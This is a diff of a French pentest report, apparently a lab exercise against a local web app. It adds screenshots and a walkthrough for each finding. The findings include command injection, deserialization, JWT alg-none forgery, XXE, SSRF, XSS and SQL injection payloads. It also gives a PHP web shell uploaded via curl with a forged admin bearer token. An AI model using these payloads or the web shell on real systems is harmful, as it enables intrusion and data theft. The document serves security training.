@@ -48,7 +48,8 @@
 
 Nous avons utilisé un token JWT valide pour s’authentifier.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/c21ed756-d781-4f74-b083-dd4aad6c96cf)
+
 
 ---
 
@@ -56,7 +57,8 @@ Nous avons utilisé un token JWT valide pour s’authentifier.
 
 Modification de l’ID dans l’URL : accès aux données d'autres employés.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/0e2532fd-29f3-44dc-933a-bc25a86b0ce7)
+
 
 ---
 
@@ -64,7 +66,8 @@ Modification de l’ID dans l’URL : accès aux données d'autres employés.
 
 Accès au fichier source `Controller.cs` via contournement des protections.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/460d5010-aba5-4f25-b928-ed6974f7807e)
+
 
 ---
 
@@ -72,7 +75,8 @@ Accès au fichier source `Controller.cs` via contournement des protections.
 
 Injection via `; whoami` dans un champ censé être un nom de domaine.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/0bdc709c-5130-4421-867e-ce7ee6279671)
+
 
 ---
 
@@ -80,7 +84,8 @@ Injection via `; whoami` dans un champ censé être un nom de domaine.
 
 Payload JSON contenant un objet `System.Diagnostics.Process`.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/11aca746-3a0d-4b7d-8fb9-dbc883ed6add)
+
 
 ---
 
@@ -88,7 +93,10 @@ Payload JSON contenant un objet `System.Diagnostics.Process`.
 
 Tentative d’évaluation dynamique. Résultat : erreur de compilation confirmant la vulnérabilité.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/d921af55-3cf1-4254-ab6d-e3784a8b1cef)
+![image](https://github.com/user-attachments/assets/6cbdffa1-33de-4939-b651-74b3bf2d2626)
+
+
 
 ---
 
@@ -96,7 +104,23 @@ Tentative d’évaluation dynamique. Résultat : erreur de compilation confirman
 
 Fichier `shell.php.svg` uploadé et accessible.
 
-**SCREENSHOT ICI**
+Nous avons commencé par créé un fichier nommé « shell.php.svg » contenant du code PHP malveillant : 
+1. <?php system($_GET["cmd"]); ?>
+
+Nous avons ensuite uploadé le fichier en utilisant la commande suivante : 
+1. curl -k -X PATCH "https://localhost:3000/Patch" \
+2.   -H "X-Forwarded-For: 10.10.10.256" \
+3.   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImFkbWluIiwiSXNBZG1pbiI6IlRydWUiLCJuYmYiOjE3NDY5MDUzNjAsImV4cCI6MTc3ODQ0MTM2MCwiaWF0IjoxNzQ2OTA1MzYwfQ.k0AB5Olhf4LRIg4t8BELqW8gug1QA_A7LOYeowfk-eg' \
+4.   -F "file=@shell.php.svg;type=image/svg+xml"
+
+La requête a réussi et le serveur a répondu avec : 
+![image](https://github.com/user-attachments/assets/35ff3661-cb6a-45a9-98d8-10308d2ff628)
+
+Nous avons ensuite vérifié que le fichier était accessible et que son contenu était intact :
+1. curl -k "https://localhost:3000/?lang=shell.php.svg" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6InVzZXIiLCJJc0FkbWluIjoiRmFsc2UiLCJuYmYiOjE3MjUyNjY1MDksImV4cCI6MTc1NjgwMjUwOSwiaWF0IjoxNzI1MjY2NTA5fQ.D_RUjJiR4eptm1DJqpPEOYMEbP6fFWgRX7ylZIFHtSE'
+
+La réponse : 
+![image](https://github.com/user-attachments/assets/795021f3-4589-467a-b728-0328852190f3)
 
 ---
 
@@ -104,7 +128,10 @@ Fichier `shell.php.svg` uploadé et accessible.
 
 Token avec alg `none` accepté ou signé avec secret trouvé.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/9cbc5616-2fbb-461f-81b1-5dd23229a9b4)
+![image](https://github.com/user-attachments/assets/18dce359-2eb1-460d-b00a-306549a46218)
+
+![image](https://github.com/user-attachments/assets/ab9dceee-2531-42f5-9b36-29b23bba7ab6)
 
 ---
 
@@ -112,7 +139,9 @@ Token avec alg `none` accepté ou signé avec secret trouvé.
 
 Fichier XML avec entité externe lisant `appsettings.json`.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/86c7b1c5-ede6-47ed-a2e5-a37cb9b1d351)
+![image](https://github.com/user-attachments/assets/e57e559d-5c23-4896-949b-fce58b5abd82)
+![image](https://github.com/user-attachments/assets/b02bbe43-201a-4d52-ad52-c78bb331326a)
 
 ---
 
@@ -120,7 +149,8 @@ Fichier XML avec entité externe lisant `appsettings.json`.
 
 Tentative de requête vers `localhost:8080`. Erreur confirmant l'accès côté serveur.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/91c36b8c-3def-45ae-b73e-ae59aa31b82f)
+
 
 ---
 
@@ -128,7 +158,8 @@ Tentative de requête vers `localhost:8080`. Erreur confirmant l'accès côté s
 
 Payload long provoquant une coupure de la connexion TLS.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/399d014f-121c-499d-a9ff-7871d0c10ecd)
+
 
 ---
 
@@ -136,7 +167,8 @@ Payload long provoquant une coupure de la connexion TLS.
 
 Dépassement d’entier entraînant une valeur négative inattendue.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/c9a23e75-a98f-4684-9a49-a53a8a1dcd5f)
+
 
 ---
 
@@ -144,7 +176,8 @@ Dépassement d’entier entraînant une valeur négative inattendue.
 
 Injection de commande pour lire les logs contenant des mots de passe.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/c67ce821-23d6-4fdb-9075-e3996515ade2)
+
 
 ---
 
@@ -152,7 +185,8 @@ Injection de commande pour lire les logs contenant des mots de passe.
 
 Payload `<img onerror=alert(document.cookie)>` exécuté côté admin.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/891b0bb4-3274-44e2-808c-1072d05d0821)
+
 
 ---
 
@@ -160,7 +194,8 @@ Payload `<img onerror=alert(document.cookie)>` exécuté côté admin.
 
 Tentative de login avec `' OR 1=1 --` provoquant une erreur SQL révélatrice.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/23d5eebc-ada9-4e55-8068-225a8d9fefa9)
+
 
 ---
 
@@ -168,7 +203,8 @@ Tentative de login avec `' OR 1=1 --` provoquant une erreur SQL révélatrice.
 
 Payload XML contenant une structure modifiée acceptée et interprétée.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/efb1cc93-1957-49cb-b736-a74738342f3e)
+
 
 ---
 
@@ -176,7 +212,10 @@ Payload XML contenant une structure modifiée acceptée et interprétée.
 
 Fichier SVG inclus dans une réponse côté serveur.
 
-**SCREENSHOT ICI**
+![image](https://github.com/user-attachments/assets/5294f34c-1305-4b67-94e7-c517ce654af3)
+
+![image](https://github.com/user-attachments/assets/a832e891-3ad5-4ab4-9e10-03a555734a1c)
+
 
 ---
 
